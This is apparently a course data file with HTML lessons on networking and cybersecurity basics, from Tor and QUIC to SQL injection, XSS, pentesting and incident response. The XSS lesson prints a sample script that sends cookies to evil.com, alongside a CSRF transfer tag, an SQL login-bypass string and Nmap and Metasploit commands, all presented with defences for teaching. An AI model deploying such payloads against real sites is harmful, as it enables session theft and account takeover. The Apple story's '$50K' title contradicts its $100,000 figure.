<ul>
<li><strong>Slow:</strong> Traffic goes through 3 extra hops. Expect 2-10x slower speeds</li>
<li><strong>Exit node risk:</strong> Unencrypted traffic (HTTP) can be read by the exit node</li>
<li><strong>Not for large downloads or streaming:</strong> Too slow and puts strain on the network</li>
<li><strong>Timing attacks:</strong> A powerful attacker watching both entry and exit could correlate traffic</li>
</ul>
<p>Tor is used by journalists, activists, whistleblowers, and privacy-conscious users. It is also used for illegal purposes, which gives it a mixed reputation.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>Your ISP sees DNS queries and SNI (domain names) even with HTTPS. DoH and ECH can hide these</li>
<li>Browser fingerprinting identifies you without cookies — canvas, fonts, GPU, screen, and more make a unique combination</li>
<li>Google and Meta track you across the web using tracking pixels and third-party cookies. They build detailed interest profiles</li>
<li>Tor routes traffic through 3 nodes (guard, middle, exit) — no single node knows both your identity and destination</li>
<li>Privacy is a spectrum: HTTPS → DoH → VPN → Tor. Each adds protection but also complexity and speed cost</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  26: {
    titleEn: "The Future of Networking",
    pages: [
      {
        titleEn: "QUIC Protocol — 0-RTT and HTTP/3",
        contentEn: `<p><strong>QUIC</strong> is the biggest change in internet transport since TCP. Built by Google, now an IETF standard (RFC 9000, 2021).</p>
<h3>Why QUIC was created:</h3>
<ul>
<li>TCP + TLS handshake takes 2-3 round trips before any data flows</li>
<li>TCP head-of-line blocking: one lost packet blocks all streams</li>
<li>Changing TCP is nearly impossible — too many middleboxes depend on it</li>
<li>Solution: build a new protocol on top of UDP</li>
</ul>
<h3>Key features:</h3>
<ul>
<li><strong>0-RTT connection:</strong> For returning visitors, data can be sent with the very first packet. No waiting</li>
<li><strong>Independent streams:</strong> Loss on stream A does not block stream B</li>
<li><strong>Built-in TLS 1.3:</strong> Always encrypted, encryption is not optional</li>
<li><strong>Connection migration:</strong> If your IP changes (Wi-Fi to cellular), the connection continues. QUIC uses connection IDs, not IP+port tuples</li>
</ul>
<h3>HTTP/3 = HTTP over QUIC:</h3>
<ul>
<li>HTTP/1.1 → HTTP/2: multiplexing on TCP</li>
<li>HTTP/2 → HTTP/3: multiplexing on QUIC (UDP). No more TCP limitations</li>
<li>Used by Google, YouTube, Facebook, Cloudflare</li>
<li>About 30% of web traffic (2024)</li>
</ul>
<p>QUIC will likely become the dominant transport protocol for the web within the next decade.</p>`
      },
      {
        titleEn: "eBPF — Programmable Kernel",
        contentEn: `<p><strong>eBPF</strong> (extended Berkeley Packet Filter) lets you run custom programs inside the Linux kernel — without changing the kernel itself.</p>
<h3>Why this matters:</h3>
<ul>
<li>Traditionally, adding features to the kernel meant writing kernel modules — risky, complex, could crash the system</li>
<li>eBPF programs run in a safe sandbox inside the kernel</li>
<li>They are verified before running — cannot crash the kernel or access unauthorized memory</li>
</ul>
<h3>Networking use cases:</h3>
<ul>
<li><strong>High-speed packet processing:</strong> Handle millions of packets per second without leaving the kernel</li>
<li><strong>Load balancing:</strong> Facebook uses eBPF (Katran) for L4 load balancing. Much faster than iptables</li>
<li><strong>Firewalls:</strong> Cloudflare uses eBPF for DDoS mitigation at wire speed</li>
<li><strong>Observability:</strong> Trace every network call, measure latency, detect anomalies — with almost zero overhead</li>
</ul>
<h3>Beyond networking:</h3>
<ul>
<li>Security monitoring (Cilium, Falco)</li>
<li>Performance profiling</li>
<li>Custom system call tracing</li>
</ul>
<p>eBPF is called "the biggest change in Linux networking in decades." It makes the kernel programmable without the risks of kernel development.</p>`
      },
      {
        titleEn: "Starlink — Internet from Space",
        contentEn: `<p><strong>Starlink</strong> (SpaceX) puts thousands of satellites in Low Earth Orbit (LEO) to provide internet everywhere.</p>
<h3>Traditional satellites vs Starlink:</h3>
<ul>
<li><strong>Geostationary (GEO):</strong> 35,786 km altitude. Latency: 600+ ms round trip. Too slow for real-time use</li>
<li><strong>Starlink (LEO):</strong> 550 km altitude. Latency: 20-60 ms. Comparable to ground-based internet</li>
</ul>
<h3>How it works:</h3>
<ul>
<li>6,000+ satellites in orbit (planned: 12,000-42,000)</li>
<li>Satellites communicate with ground terminals (dish antennas)</li>
<li>Laser links between satellites allow traffic to hop between them without touching the ground</li>
<li>Speeds: 50-250 Mbps download (depends on location and congestion)</li>
</ul>
<h3>Why it matters for networking:</h3>
<ul>
<li><strong>Rural areas:</strong> Internet where no cable or fiber exists</li>
<li><strong>Disaster recovery:</strong> Deployed in Ukraine, natural disaster zones</li>
<li><strong>Maritime and aviation:</strong> Internet on ships and planes</li>
<li><strong>Potentially faster than fiber for long distances:</strong> Light travels faster in vacuum than in glass. Laser links between satellites could beat undersea cables for intercontinental traffic</li>
</ul>
<h3>Challenges:</h3>
<ul>
<li>Space debris and orbital congestion</li>
<li>Limited capacity per area (shared bandwidth)</li>
<li>Astronomy impact (light pollution)</li>
</ul>`
      },
      {
        titleEn: "Service Mesh and Zero Trust",
        contentEn: `<p>The old security model: trust everything inside the corporate network. The new model: <strong>trust nothing, verify everything</strong>.</p>
<h3>Why the old model broke:</h3>
<ul>
<li>Remote work: employees are not inside the office network</li>
<li>Cloud services: data is not in your data center</li>
<li>Once an attacker gets inside the perimeter, they can move freely</li>
</ul>
<h3>Zero Trust principles:</h3>
<ul>
<li><strong>Verify every request:</strong> Identity, device health, location, behavior — every time</li>
<li><strong>Least privilege:</strong> Give the minimum access needed, nothing more</li>
<li><strong>Assume breach:</strong> Design as if an attacker is already inside</li>
<li><strong>Encrypt everything:</strong> Even internal traffic between services</li>
</ul>
<h3>Service Mesh enables Zero Trust:</h3>
<ul>
<li><strong>mTLS (mutual TLS):</strong> Both sides of every connection prove their identity</li>
<li><strong>Fine-grained policies:</strong> Service A can talk to Service B, but not Service C</li>
<li><strong>Automatic certificate rotation:</strong> Keys change regularly, limiting breach impact</li>
<li><strong>Observability:</strong> Every request is logged, traced, and measured</li>
</ul>
<h3>Tools:</h3>
<ul>
<li><strong>Istio:</strong> Most popular service mesh, uses Envoy proxy sidecars</li>
<li><strong>Cilium:</strong> eBPF-based, no sidecars needed, faster</li>
<li><strong>Cloudflare Zero Trust:</strong> Replaces VPN for remote access</li>
</ul>
<p>Zero Trust is not a product. It is an architecture that assumes the network is always hostile.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>QUIC: UDP-based transport with 0-RTT, independent streams, built-in encryption, and connection migration. Powers HTTP/3</li>
<li>eBPF: Run custom programs safely inside the Linux kernel. Enables high-speed packet processing, load balancing, and observability</li>
<li>Starlink: 6,000+ LEO satellites at 550 km. Latency 20-60 ms. Brings internet to areas without cables. Laser inter-satellite links</li>
<li>Zero Trust: Trust nothing, verify everything. Service mesh (Istio, Cilium) enforces mTLS, policies, and observability between services</li>
<li>These technologies are reshaping how networks are built, secured, and delivered</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  // ========== CYBER TRACK (101-115) ==========
101: {
    titleEn: "The CIA Triad & Threat Modeling",
    pages: [
      {
        titleEn: "The CIA Triad",
        contentEn: `<p>Every security system is built on three pillars — the <strong>CIA Triad</strong>:</p>

<ul>
<li><strong>Confidentiality</strong> — only the right people can see the data. Example: encryption, access control.</li>
<li><strong>Integrity</strong> — data is not changed without permission. Example: checksums, digital signatures.</li>
<li><strong>Availability</strong> — the system works when users need it. Example: backups, redundancy.</li>
</ul>

<p>If one pillar breaks, the whole system is at risk.</p>

<p><strong>Quick check:</strong></p>
<ul>
<li>A hacker deletes your database → which pillar is broken? → <strong>Availability</strong></li>
<li>A hacker reads your passwords → <strong>Confidentiality</strong></li>
<li>A hacker changes your bank balance → <strong>Integrity</strong></li>
</ul>`
      },
      {
        titleEn: "STRIDE Threat Modeling",
        contentEn: `<p><strong>STRIDE</strong> is a framework by Microsoft. It helps teams find threats before attackers do.</p>

<p>Each letter is a threat type:</p>
<ul>
<li><strong>S</strong>poofing — pretending to be someone else (fake login)</li>
<li><strong>T</strong>ampering — changing data without permission</li>
<li><strong>R</strong>epudiation — denying you did something (no logs)</li>
<li><strong>I</strong>nformation Disclosure — leaking private data</li>
<li><strong>D</strong>enial of Service — making the system unavailable</li>
<li><strong>E</strong>levation of Privilege — getting admin access as a normal user</li>
</ul>

<p><strong>How to use STRIDE:</strong></p>
<ol>
<li>Draw a diagram of your system</li>
<li>For each component, ask: "Can an attacker do S? T? R? I? D? E?"</li>
<li>For each threat found, plan a defense</li>
</ol>`
      },
      {
        titleEn: "Story: The Target Breach (2013)",
        contentEn: `<p>In December 2013, hackers stole <strong>40 million</strong> credit card numbers from Target stores.</p>

<p><strong>How it happened:</strong></p>
<ul>
<li>Attackers sent a phishing email to an HVAC company (heating/cooling vendor)</li>
<li>The vendor had network access to Target for billing</li>
<li>Hackers used that access to move inside Target's network</li>
<li>They installed malware on cash registers (POS systems)</li>
<li>Every credit card swipe was copied and sent to the attackers</li>
</ul>

<p><strong>CIA Triad analysis:</strong></p>
<ul>
<li><strong>Confidentiality</strong> broken — 40M card numbers leaked</li>
<li><strong>Integrity</strong> broken — malware changed how POS systems worked</li>
<li><strong>Availability</strong> was fine — stores kept working (that's why nobody noticed)</li>
</ul>

<p><strong>Lesson:</strong> Your security is only as strong as your weakest vendor. This attack started with a simple phishing email.</p>

<p><strong>Cost to Target:</strong> $292 million in damages. The CEO and CIO both lost their jobs.</p>`
      }
    ]
  },

  102: {
    titleEn: "Network Attacks: ARP, SYN Flood & DDoS",
    pages: [
      {
        titleEn: "ARP Spoofing & Man-in-the-Middle",
        contentEn: `<p><strong>ARP</strong> (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network.</p>

<p><strong>ARP Spoofing attack:</strong></p>
<ol>
<li>Attacker sends fake ARP messages to the network</li>
<li>Tells the victim: "I am the router" (sends attacker's MAC)</li>
<li>Tells the router: "I am the victim"</li>
<li>Now all traffic flows through the attacker — <strong>Man-in-the-Middle (MITM)</strong></li>
</ol>

<p><strong>What the attacker can do:</strong></p>
<ul>
<li>Read unencrypted passwords and messages</li>
<li>Modify data in transit (change a bank transfer amount)</li>
<li>Inject malicious code into web pages</li>
</ul>

<p><strong>Defenses:</strong></p>
<ul>
<li>Use <strong>HTTPS</strong> everywhere (encrypted traffic)</li>
<li>Enable <strong>Dynamic ARP Inspection (DAI)</strong> on switches</li>
<li>Use <strong>VPN</strong> on untrusted networks (coffee shop WiFi)</li>
<li>Static ARP entries for critical servers</li>
</ul>`
      },
      {
        titleEn: "SYN Flood & TCP Exhaustion",
        contentEn: `<p><strong>TCP 3-Way Handshake</strong> (normal):</p>
<ol>
<li>Client sends <strong>SYN</strong> → "I want to connect"</li>
<li>Server sends <strong>SYN-ACK</strong> → "OK, go ahead"</li>
<li>Client sends <strong>ACK</strong> → "Connected!"</li>
</ol>

<p><strong>SYN Flood attack:</strong></p>
<ul>
<li>Attacker sends thousands of SYN packets with fake source IPs</li>
<li>Server sends SYN-ACK and waits for ACK... that never comes</li>
<li>Server's connection table fills up — <strong>no room for real users</strong></li>
<li>Result: legitimate users cannot connect</li>
</ul>

<p><strong>Why it works:</strong></p>
<ul>
<li>The server must keep each half-open connection in memory</li>
<li>Default timeout is 75 seconds per connection</li>
<li>Attacker can send millions of SYNs per second</li>
</ul>

<p><strong>Defenses:</strong></p>
<ul>
<li><strong>SYN Cookies</strong> — server doesn't store state until handshake completes</li>
<li><strong>Rate limiting</strong> — limit SYN packets per source IP</li>
<li><strong>Firewall rules</strong> — detect and block flood patterns</li>
</ul>`
      },
      {
        titleEn: "Story: The 3.47 Tbps DDoS Attack",
        contentEn: `<p>In November 2021, Microsoft Azure stopped the <strong>largest DDoS attack ever recorded</strong>: <strong>3.47 Tbps</strong> (terabits per second).</p>

<p><strong>Scale:</strong></p>
<ul>
<li>3.47 Tbps = downloading ~43,000 HD movies per second</li>
<li>The attack came from <strong>10,000+ sources</strong> across 10+ countries</li>
<li>It lasted only 15 minutes but peaked at 340 million packets per second</li>
</ul>

<p><strong>How it was stopped:</strong></p>
<ul>
<li>Azure's DDoS Protection platform detected the spike in seconds</li>
<li>Traffic was spread across Microsoft's global network (160+ data centers)</li>
<li>Bad traffic was filtered; good traffic passed through</li>
<li>The customer's service stayed online the entire time</li>
</ul>

<p><strong>Types of DDoS:</strong></p>
<ul>
<li><strong>Volumetric</strong> — flood the bandwidth (UDP flood, DNS amplification)</li>
<li><strong>Protocol</strong> — exhaust server resources (SYN flood, Ping of Death)</li>
<li><strong>Application</strong> — target specific services (HTTP flood, Slowloris)</li>
</ul>

<p><strong>Key point:</strong> You cannot stop DDoS alone. You need cloud-scale protection (Azure, Cloudflare, AWS Shield).</p>`
      }
    ]
  },

  103: {
    titleEn: "Web Attacks: SQL Injection, XSS & OWASP",
    pages: [
      {
        titleEn: "SQL Injection (SQLi)",
        contentEn: `<p><strong>SQL Injection</strong> — the attacker puts SQL code into input fields to control the database.</p>

<p><strong>Example — login bypass:</strong></p>
<pre><code>Username: admin' --
<p>Password: anything</p>
</code></pre>

<p>The server builds this query:</p>
<pre><code>sql
<p>SELECT * FROM users WHERE name='admin' --' AND pass='anything'</p>
</code></pre>

<p>The <code>--</code> is a comment. Everything after it is ignored. The attacker logs in as admin without a password.</p>

<p><strong>What an attacker can do:</strong></p>
<ul>
<li>Read all data (usernames, passwords, credit cards)</li>
<li>Modify or delete data</li>
<li>Execute system commands (on some databases)</li>
</ul>

<p><strong>Defenses:</strong></p>
<ul>
<li><strong>Parameterized queries</strong> (prepared statements) — #1 defense</li>
<li><strong>Input validation</strong> — reject special characters</li>
<li><strong>WAF</strong> (Web Application Firewall) — block known attack patterns</li>
<li><strong>Least privilege</strong> — database user should not be admin</li>
</ul>`
      },
      {
        titleEn: "XSS and CSRF",
        contentEn: `<p><strong>XSS (Cross-Site Scripting)</strong> — attacker injects JavaScript into a web page.</p>

<p><strong>Types:</strong></p>
<ul>
<li><strong>Stored XSS</strong> — script is saved in the database (e.g., in a comment). Every user who views it gets attacked.</li>
<li><strong>Reflected XSS</strong> — script is in the URL. Victim clicks a malicious link.</li>
<li><strong>DOM XSS</strong> — script runs from client-side JavaScript, never touches the server.</li>
</ul>

<p><strong>Example:</strong></p>
<pre><code>html
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
</code></pre>

<p><strong>CSRF (Cross-Site Request Forgery)</strong> — the attacker tricks your browser into making a request you didn't intend.</p>

<p><strong>Example:</strong> You are logged into your bank. You visit a malicious page with:</p>
<pre><code>html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
</code></pre>
<p>Your browser sends the request with your session cookie. The bank thinks it's you.</p>

<p><strong>Defenses:</strong></p>
<ul>
<li>XSS → <strong>escape/encode</strong> all user output, use <strong>Content Security Policy (CSP)</strong></li>
<li>CSRF → <strong>CSRF tokens</strong>, <strong>SameSite cookies</strong>, check <strong>Referer header</strong></li>
</ul>`
      },
      {
        titleEn: "OWASP Top 10 (2021)",
        contentEn: `<p><strong>OWASP</strong> (Open Web Application Security Project) publishes the top 10 web security risks every few years.</p>

<p><strong>The 2021 list:</strong></p>

<table>
<thead><tr><th>#</th><th>Risk</th><th>Example</th></tr></thead>
<tbody>
<tr><td>1</td><td><strong>Broken Access Control</strong></td><td>User changes URL to access admin page</td></tr>
<tr><td>2</td><td><strong>Cryptographic Failures</strong></td><td>Passwords stored in plain text</td></tr>
<tr><td>3</td><td><strong>Injection</strong></td><td>SQL injection, command injection</td></tr>
<tr><td>4</td><td><strong>Insecure Design</strong></td><td>No rate limiting on login (brute force)</td></tr>
<tr><td>5</td><td><strong>Security Misconfiguration</strong></td><td>Default passwords, open S3 buckets</td></tr>
<tr><td>6</td><td><strong>Vulnerable Components</strong></td><td>Using old library with known CVE</td></tr>
<tr><td>7</td><td><strong>Auth Failures</strong></td><td>Weak passwords, no MFA</td></tr>
<tr><td>8</td><td><strong>Data Integrity Failures</strong></td><td>Insecure deserialization, no code signing</td></tr>
<tr><td>9</td><td><strong>Logging Failures</strong></td><td>No logs → can't detect attacks</td></tr>
<tr><td>10</td><td><strong>SSRF</strong></td><td>Server fetches attacker-controlled URL</td></tr>
</tbody></table>

<p><strong>Key changes from 2017:</strong></p>
<ul>
<li>Broken Access Control moved from #5 to #1</li>
<li>Insecure Design is new (focus on threat modeling)</li>
<li>SSRF is new (cloud environments made it worse)</li>
</ul>`
      }
    ]
  },

  104: {
    titleEn: "Penetration Testing",
    pages: [
      {
        titleEn: "The Pentest Lifecycle",
        contentEn: `<p><strong>Penetration testing (pentest)</strong> = authorized hacking to find security weaknesses.</p>

<p><strong>5 phases:</strong></p>

<p><strong>1. Reconnaissance (Recon)</strong></p>
<ul>
<li>Passive: Google dorking, WHOIS, LinkedIn, Shodan</li>
<li>Active: port scanning, service detection</li>
<li>Goal: learn everything about the target</li>
</ul>

<p><strong>2. Scanning & Enumeration</strong></p>
<ul>
<li>Find open ports, running services, versions</li>
<li>Identify operating systems and technologies</li>
<li>Look for known vulnerabilities (CVEs)</li>
</ul>

<p><strong>3. Exploitation</strong></p>
<ul>
<li>Try to break in using found vulnerabilities</li>
<li>Gain initial access (foothold)</li>
<li>Escalate privileges if possible</li>
</ul>

<p><strong>4. Post-Exploitation</strong></p>
<ul>
<li>Move laterally (access other systems)</li>
<li>Maintain access (persistence)</li>
<li>Collect evidence (screenshots, data samples)</li>
</ul>

<p><strong>5. Reporting</strong></p>
<ul>
<li>Document every finding with severity rating</li>
<li>Include proof-of-concept (PoC) for each vulnerability</li>
<li>Recommend fixes with priority order</li>
</ul>

<p><strong>Important:</strong> Always get <strong>written permission</strong> before testing. Without it, it's a crime.</p>`
      },
      {
        titleEn: "Essential Pentest Tools",
        contentEn: `<p><strong>Nmap</strong> — network scanner</p>
<ul>
<li>Finds open ports and running services</li>
<li><code>nmap -sV -sC target.com</code> — version detection + default scripts</li>
<li><code>nmap -p- target.com</code> — scan all 65,535 ports</li>
<li>Can detect OS, firewalls, and vulnerabilities</li>
</ul>

<p><strong>Burp Suite</strong> — web application proxy</p>
<ul>
<li>Intercepts HTTP/HTTPS requests between browser and server</li>
<li><strong>Repeater</strong> — modify and resend requests</li>
<li><strong>Intruder</strong> — automated fuzzing and brute force</li>
<li><strong>Scanner</strong> — automatic vulnerability detection (Pro version)</li>
</ul>

<p><strong>Metasploit</strong> — exploitation framework</p>
<ul>
<li>Database of 2,000+ exploits</li>
<li><code>search ms17-010</code> → find EternalBlue exploit</li>
<li><code>use exploit/...</code> → <code>set RHOST target</code> → <code>exploit</code></li>
<li><strong>Meterpreter</strong> — powerful post-exploitation shell</li>
</ul>

<p><strong>Other key tools:</strong></p>
<ul>
<li><strong>Wireshark</strong> — packet capture and analysis</li>
<li><strong>John the Ripper / Hashcat</strong> — password cracking</li>
<li><strong>Gobuster / ffuf</strong> — directory and file brute forcing</li>
<li><strong>SQLMap</strong> — automated SQL injection testing</li>
</ul>`
      },
      {
        titleEn: "Story: Red Team vs. The Bank",
        contentEn: `<p>A major bank hired a Red Team to test their security. The rules: get access to the CEO's email within 2 weeks.</p>

<p><strong>Week 1 — Reconnaissance:</strong></p>
<ul>
<li>Team found the bank's IT staff on LinkedIn</li>
<li>Discovered the bank used Microsoft 365 and Citrix VPN</li>
<li>Found an old subdomain: <code>test-portal.bank.com</code> — still running</li>
</ul>

<p><strong>Week 1 — Initial Access:</strong></p>
<ul>
<li>The test portal had a known Citrix vulnerability (CVE-2019-19781)</li>
<li>Team exploited it and got a shell on an internal server</li>
<li>Found a shared drive with an Excel file: "IT_passwords_2019.xlsx"</li>
</ul>

<p><strong>Week 2 — Lateral Movement:</strong></p>
<ul>
<li>Old passwords still worked for 3 IT admin accounts</li>
<li>Used admin access to reach the Exchange email server</li>
<li>Read the CEO's inbox — mission complete in 8 days</li>
</ul>

<p><strong>Report findings:</strong></p>
<ul>
<li>Critical: unpatched public-facing server</li>
<li>Critical: passwords stored in plain text on shared drive</li>
<li>High: old passwords never rotated</li>
<li>High: no network segmentation (test server could reach email)</li>
</ul>

<p><strong>Result:</strong> The bank fixed all findings, and the Red Team was invited back for a retest 6 months later.</p>`
      }
    ]
  },

  105: {
    titleEn: "Defense in Depth & Incident Response",
    pages: [
      {
        titleEn: "Defense in Depth",
        contentEn: `<p><strong>Defense in Depth</strong> = multiple layers of security. If one layer fails, the next one catches the attack.</p>

<p><strong>The layers (outside → inside):</strong></p>

<ul>
<li><strong>Physical</strong> — locked server rooms, security cameras, badge access</li>
<li><strong>Perimeter</strong> — firewalls, IDS/IPS, DMZ</li>
<li><strong>Network</strong> — segmentation, VLANs, ACLs, network monitoring</li>
<li><strong>Host</strong> — antivirus, host firewall, patching, hardening</li>
<li><strong>Application</strong> — secure coding, input validation, WAF</li>
<li><strong>Data</strong> — encryption, access control, backups, DLP</li>
</ul>

<p><strong>Why layers matter:</strong></p>
<ul>
<li>Firewall blocks 99% of attacks → but 1% gets through</li>
<li>Antivirus catches most malware → but zero-days pass</li>
<li>Encryption protects data → but only if keys are safe</li>
</ul>

<p><strong>Analogy:</strong> A castle has walls, a moat, guards, locked doors, and a safe. An attacker must beat ALL of them, not just one.</p>

<p><strong>Key principles:</strong></p>
<ul>
<li>No single point of failure</li>
<li>Assume every layer will be bypassed</li>
<li>Monitor every layer for alerts</li>
</ul>`
      },
      {
        titleEn: "SIEM & Incident Response",
        contentEn: `<p><strong>SIEM</strong> (Security Information and Event Management) — collects logs from all systems and finds threats.</p>

<p><strong>What SIEM does:</strong></p>
<ul>
<li>Collects logs from firewalls, servers, endpoints, apps</li>
<li>Correlates events across systems</li>
<li>Detects patterns (e.g., 100 failed logins then 1 success = brute force)</li>
<li>Generates alerts for the SOC (Security Operations Center) team</li>
</ul>

<p><strong>Popular SIEM tools:</strong> Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM</p>

<p><strong>Incident Response (IR) — 6 phases (NIST):</strong></p>
<ol>
<li><strong>Preparation</strong> — build the IR team, write playbooks, set up tools</li>
<li><strong>Identification</strong> — detect the incident (SIEM alert, user report)</li>
<li><strong>Containment</strong> — stop the attack from spreading (isolate systems)</li>
<li><strong>Eradication</strong> — remove the attacker (delete malware, patch vuln)</li>
<li><strong>Recovery</strong> — restore systems from clean backups, monitor closely</li>
<li><strong>Lessons Learned</strong> — what happened? how to prevent it next time?</li>
</ol>

<p><strong>SOC analyst tiers:</strong></p>
<ul>
<li><strong>Tier 1</strong> — monitors alerts, triages (real or false positive?)</li>
<li><strong>Tier 2</strong> — investigates confirmed incidents</li>
<li><strong>Tier 3</strong> — threat hunting, malware analysis, forensics</li>
</ul>`
      },
      {
        titleEn: "Story: SOC Analyst Finds an APT",
        contentEn: `<p>Monday morning. A Tier 1 SOC analyst notices something strange in the SIEM:</p>

<p><strong>The alert:</strong> A server in the finance department made DNS requests to a domain registered 2 days ago. The requests happened every 4 hours, exactly.</p>

<p><strong>Why it's suspicious:</strong></p>
<ul>
<li>New domains are often used by attackers</li>
<li>Regular 4-hour intervals suggest automated malware (beaconing)</li>
<li>Finance servers should not make unusual DNS requests</li>
</ul>

<p><strong>Investigation (Tier 2):</strong></p>
<ul>
<li>The domain resolved to an IP in Eastern Europe</li>
<li>The DNS requests contained encoded data in the subdomain field — <strong>DNS exfiltration</strong></li>
<li>The server had a hidden scheduled task running a PowerShell script</li>
<li>The script collected financial reports and sent them via DNS</li>
</ul>

<p><strong>Discovery:</strong></p>
<ul>
<li>The attacker had been inside the network for <strong>6 months</strong> (APT — Advanced Persistent Threat)</li>
<li>Entry point: a spear-phishing email to the CFO with a weaponized PDF</li>
<li>The PDF exploited an Adobe Reader vulnerability</li>
</ul>

<p><strong>Response:</strong></p>
<ul>
<li>Contained: isolated the server and blocked the domain</li>
<li>Eradicated: removed the scheduled task and backdoor</li>
<li>Recovered: rebuilt the server from a clean image</li>
<li>Lesson: deployed DNS monitoring and blocked DNS over non-standard ports</li>
</ul>

<p><strong>Key takeaway:</strong> APTs are quiet. Without SIEM and trained analysts, this could have continued for years.</p>`
      }
    ]
  },

  106: {
    titleEn: "CTF & Bug Bounty",
    pages: [
      {
        titleEn: "Capture The Flag (CTF)",
        contentEn: `<p><strong>CTF</strong> = a hacking competition where teams solve security challenges to find hidden "flags" (secret strings).</p>

<p><strong>CTF types:</strong></p>
<ul>
<li><strong>Jeopardy</strong> — categories with challenges of different difficulty. Categories: Web, Crypto, Reverse Engineering, Forensics, Binary Exploitation (pwn)</li>
<li><strong>Attack-Defense</strong> — each team has a server. Attack other teams while defending your own.</li>
<li><strong>King of the Hill</strong> — capture and hold a server as long as possible.</li>
</ul>

<p><strong>Example challenge (Web):</strong></p>
<ul>
<li>You get a website with a login page</li>
<li>The hint says: "The admin left a note"</li>
<li>You check the HTML source → hidden comment: <code><!-- password: s3cur3 --></code></li>
<li>Login with admin/s3cur3 → get the flag: <code>FLAG{html_comments_are_not_secure}</code></li>
</ul>

<p><strong>Skills you learn:</strong></p>
<ul>
<li>Web exploitation (SQLi, XSS, SSRF)</li>
<li>Binary analysis and reverse engineering</li>
<li>Cryptography (break weak encryption)</li>
<li>Forensics (analyze pcap files, disk images, memory dumps)</li>
</ul>

<p><strong>Where to practice:</strong></p>
<ul>
<li><strong>PicoCTF</strong> — beginner friendly (by Carnegie Mellon)</li>
<li><strong>HackTheBox</strong> — virtual machines to hack</li>
<li><strong>TryHackMe</strong> — guided learning paths</li>
<li><strong>OverTheWire</strong> — Linux and networking challenges</li>
</ul>`
      },
      {
        titleEn: "Bug Bounty Programs",
        contentEn: `<p><strong>Bug Bounty</strong> = companies pay hackers to find and report security vulnerabilities.</p>

<p><strong>How it works:</strong></p>
<ol>
<li>Company publishes a program (scope, rules, rewards)</li>
<li>Hackers find vulnerabilities and write reports</li>
<li>Company verifies and pays based on severity</li>
</ol>

<p><strong>Severity and typical rewards:</strong></p>
<ul>
<li><strong>Critical</strong> (RCE, auth bypass) → $10,000 – $100,000+</li>
<li><strong>High</strong> (SQLi, SSRF, privilege escalation) → $5,000 – $25,000</li>
<li><strong>Medium</strong> (stored XSS, IDOR) → $1,000 – $5,000</li>
<li><strong>Low</strong> (reflected XSS, info disclosure) → $100 – $1,000</li>
</ul>

<p><strong>Major platforms:</strong></p>
<ul>
<li><strong>HackerOne</strong> — largest platform, $300M+ paid total</li>
<li><strong>Bugcrowd</strong> — second largest, strong triage team</li>
<li><strong>Intigriti</strong> — popular in Europe</li>
</ul>

<p><strong>The industry in numbers:</strong></p>
<ul>
<li>$1.5 billion+ paid to hackers total (all platforms)</li>
<li>Top hackers earn $500K+ per year</li>
<li>30,000+ organizations run programs</li>
<li>Average time to first valid bug: 2-3 months for beginners</li>
</ul>

<p><strong>Tips for beginners:</strong></p>
<ul>
<li>Start with programs that have a wide scope</li>
<li>Focus on one vulnerability type (e.g., IDOR)</li>
<li>Read disclosed reports on HackerOne to learn</li>
<li>Write clear reports with steps to reproduce</li>
</ul>`
      },
      {
        titleEn: "Story: Apple's $50K Bounty",
        contentEn: `<p>In 2020, a security researcher found a critical vulnerability in <strong>Apple's Sign In</strong> system.</p>

<p><strong>The bug:</strong></p>
<ul>
<li>"Sign in with Apple" lets you log into apps using your Apple ID</li>
<li>The researcher found he could request a token for <strong>any Apple ID email</strong></li>
<li>With this token, he could log into any app that uses "Sign in with Apple" — as any user</li>
</ul>

<p><strong>Impact:</strong></p>
<ul>
<li>Full account takeover on any app using Apple Sign In</li>
<li>Affected millions of users on thousands of apps</li>
<li>No user interaction needed — completely silent attack</li>
</ul>

<p><strong>How he reported it:</strong></p>
<ol>
<li>Found the bug and tested on his own accounts</li>
<li>Wrote a detailed report with proof-of-concept</li>
<li>Submitted to Apple's Bug Bounty program</li>
<li>Apple confirmed and fixed the bug within days</li>
</ol>

<p><strong>Reward: $100,000</strong> (Apple's highest bounty category)</p>

<p><strong>Why this story matters:</strong></p>
<ul>
<li>One person, one bug, huge impact</li>
<li>Responsible disclosure protected millions of users</li>
<li>The researcher earned $100K legally — and built his reputation</li>
<li>Without bug bounties, this bug might have been sold on the dark web or exploited silently</li>
</ul>

<p><strong>The alternative:</strong> On the black market, this bug could sell for $500K+. Bug bounties give hackers a legal and ethical path.</p>`
      }
    ]
  },

  107: {
    titleEn: "Cryptography & Encryption",
    pages: [
      {
        titleEn: "Symmetric vs Asymmetric Encryption",
        contentEn: `<p><strong>Encryption</strong> = turning readable data (plaintext) into unreadable data (ciphertext). Only someone with the key can read it.</p>

<p><strong>Symmetric encryption</strong> — same key to encrypt and decrypt:</p>
<ul>
<li>Fast, efficient for large data</li>
<li>Problem: how do you share the key securely?</li>
<li>Algorithms: <strong>AES</strong> (standard, 128/256 bit), DES (old, broken), ChaCha20</li>
</ul>

<p><strong>Example:</strong></p>
<pre><code>Plaintext: "Hello" + Key: "s3cr3t" → Ciphertext: "x7#kQ..."
<p>Ciphertext: "x7#kQ..." + Key: "s3cr3t" → Plaintext: "Hello"</p>
</code></pre>

<p><strong>Asymmetric encryption</strong> — two keys: public key + private key:</p>
<ul>
<li>Public key encrypts → only private key can decrypt</li>
<li>Slow, used for small data (keys, signatures)</li>
<li>Algorithms: <strong>RSA</strong> (2048/4096 bit), <strong>ECC</strong> (smaller keys, same security)</li>
</ul>

<p><strong>Example:</strong></p>
<pre><code>Alice wants to send Bob a message:
<ol>
<li>Bob shares his PUBLIC key with Alice</li>
<li>Alice encrypts with Bob's public key</li>
<li>Only Bob's PRIVATE key can decrypt</li>
</ol>
</code></pre>

